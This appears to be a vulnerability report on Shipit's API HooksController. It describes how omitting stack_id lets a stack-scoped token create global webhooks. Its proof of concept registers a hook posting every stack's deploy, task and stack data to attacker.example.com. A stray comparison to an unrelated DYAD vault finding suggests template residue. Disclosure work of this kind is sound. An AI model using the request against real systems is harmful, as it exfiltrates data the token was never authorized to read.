Confirmed. The vulnerability is in `Shipit::Api::HooksController`, specifically the `stack_id` and `hooks` private methods.### Title
Stack-scoped API tokens can create/read/update/destroy global webhooks that leak every stack's deploy/task data - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` can be scoped to a single stack via its `stack_id` association, and every API request is supposed to be restricted to that stack through `Api::BaseController#stacks`/`#stack`. `Api::HooksController`, however, computes the `stack_id` used to filter `Hook` records with its own private helper that silently falls back to `nil` (the "global hooks" scope) whenever the `stack_id` request parameter is omitted, bypassing the `stacks` scoping check entirely.

### Finding Description
`Api::BaseController` scopes all stack lookups to the calling token: [1](#0-0) 

Every controller that wants to touch a specific stack is expected to route through `stack`/`stacks`, which raises unless the requested stack is inside the token's authorized scope (`current_api_client.stack_id`).

`Api::HooksController` does not do this. It computes its own `stack_id` filter for the `Hook` model: [2](#0-1) 

`stack_id` returns `stack.id` (which enforces scoping) **only if `params[:stack_id]` is present**. If the caller simply omits `stack_id`, the method returns `nil` without ever consulting `current_api_client.stack_id` or calling `stack` at all. `hooks` then resolves to `Hook.where(stack_id: nil)` — i.e. the **global** hook scope: [3](#0-2) 

Global hooks are delivered for every event fired by `Hook.emit`/`Hook.deliver`, for *every* stack in the installation, not just the stack the token is bound to: [4](#0-3) 

The only authorization check performed by `HooksController` is a scope-level permission (`write:hook`/`read:hook`) via `require_permission`, which only asks "does this token have the `write:hook` permission" — it never asks "is this token's `stack_id` compatible with the hook being created/read": [5](#0-4) [6](#0-5) 

This breaks the intended equality: `ApiClient#stack_id` (the stack the token authorizes) ≠ the stack(s) whose events the created/read/updated/destroyed hook actually touches (all stacks, via the global/`nil` scope). This is the direct analog of the report's core bug class: a resource is registered under a broader/incompatible scope than the credential that authorized the write, letting an attacker "double count"/expand what a narrowly-scoped credential can influence, analogous to how a WETH vault was licensed into two incompatible ledgers in the original DYAD finding.

### Impact Explanation
A caller who only holds a single-stack-scoped `ApiClient` (e.g. an `ApiClient` created with `stack: shipit`, `permissions: ['write:hook']`, as seen in the `here_come_the_walrus`-style fixtures) can call `POST /api/hooks` without a `stack_id` param and register a webhook that fires on `stack`, `deploy`, `task`, `rollback`, `merge`, `pull_request`, etc. events **for every stack in the Shipit installation**, not just the one it was authorized for. Because `Hook.coerce_payload`/`deliver!` serialize the full event payload (including deploy/task/stack details) to an attacker-controlled `delivery_url`, this results in unauthenticated exfiltration of every other stack's deploy output, commit/task metadata, and stack state to a URL the attacker chooses — data the token was never authorized to read. The same bypass also lets the token read (`GET /api/hooks`), update, or destroy pre-existing global hooks belonging to the whole installation, again beyond its authorized stack.

### Likelihood Explanation
Any holder of a legitimately-issued, narrowly-scoped `ApiClient` token with the `write:hook`/`read:hook` permission (a normal, low-privilege token type intentionally scoped to one stack) can trigger this simply by omitting the `stack_id` parameter from an otherwise ordinary, documented API call — no additional session, admin access, or exploitation of a second bug is required.

### Recommendation
In `Api::HooksController`, derive the filter for `hooks`/`stack_id` from the token's authorized scope rather than trusting parameter presence: if `current_api_client.stack_id?` is true, always force `stack_id` to `current_api_client.stack_id` (and reject/ignore an inconsistent `params[:stack_id]`); only allow the "global hooks" (`stack_id: nil`) branch for unscoped clients (`UnlimitedApiClient` or `ApiClient` with `stack_id` nil and a broader `write:hook`/`read:hook` grant reserved for admin-level tokens). Route the lookup through the existing `stack` helper (which already enforces `stacks.from_param!`) instead of a bespoke helper that can silently resolve to `nil`.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to a single stack, e.g. `stack: shipit-repo`, `permissions: ['write:hook']` (mirrors the `here_come_the_walrus` fixture pattern in `test/fixtures/shipit/api_clients.yml`).
2. Using that token's Basic-Auth credentials, call:
   ```
   POST /api/hooks
   Authorization: Basic base64(token)
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "stack"]
   }
   ```
   Note: no `stack_id` param is supplied.
3. `HooksController#stack_id` returns `nil` (params[:stack_id] absent), so `hooks` resolves to `Hook.where(stack_id: nil)`, and `hooks.create(params)` persists a **global** `Hook` row (`stack_id: nil`).
4. When any deploy/task/stack event occurs on *any* stack in the installation (not just the one the token is scoped to), `Hook.deliver`/`Hook.emit` finds this hook via `Hook.global`/`for_stack` and POSTs the full event payload to `https://attacker.example.com/collect`, leaking data for stacks the original token was never authorized to touch.
